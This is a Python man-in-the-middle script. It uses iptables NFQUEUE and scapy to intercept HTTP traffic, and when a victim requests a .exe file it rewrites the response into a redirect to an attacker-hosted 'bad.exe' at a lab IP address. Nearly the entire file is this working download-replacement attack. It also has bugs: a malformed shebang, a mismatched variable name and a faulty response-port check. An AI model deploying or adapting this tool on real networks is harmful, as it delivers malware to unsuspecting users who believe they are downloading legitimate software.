#!usr/bin/env python
import scapy.all as scapy
import netfilterqueue
import subprocess

ackList = []
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)

def set_load(scapyPacket, load):
    '''
    DOCSTRING: Установить нагрузку пакетов
    INPUT: Пакет [scapyPacket], данные из пакета в формате http [load]
    OUTPUT: Пакет [scapyPacket]
    '''
    scapyPacket[scapy.Raw].load = load
    del scapyPacket[scapy.IP].len
    del scapyPacket[scapy.IP].chksum
    del scapyPacket[scapy.TCP].chksum
    return scapyPacket

def process_packet(packet):
    '''
    DOCSTRING: Чтение из очереди пакетов
    INPUT: Пакет [packet]
    OUTPUT: Нет
    '''
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.Raw):
        if scapyPacket[scapy.TCP].dport == 80:
            print("[+] HTTP Req")
            if ".exe" in scapyPacket[scapy.Raw].load:
                print("[+] exe Req")
                ackList.append(scapyPacket[scapy.TCP].ack)
        elif scapyPacket[scapy.TCP] == 80:
            print("[+] HTTP Res")
            if scapyPacket[scapy.TCP].seq in ack_list:
                ackList.remove(scapyPacket[scapy.TCP].seq)
                print("[+] Replacing file")
                modifiedPacket = set_load(scapyPacket, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.4/bad/bad.exe\n\n")

                packet.set_payload(str(modifiedPacket))
    packet.accept()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n\n[-] Closing...")
    subprocess.call("iptables --flush", shell=True)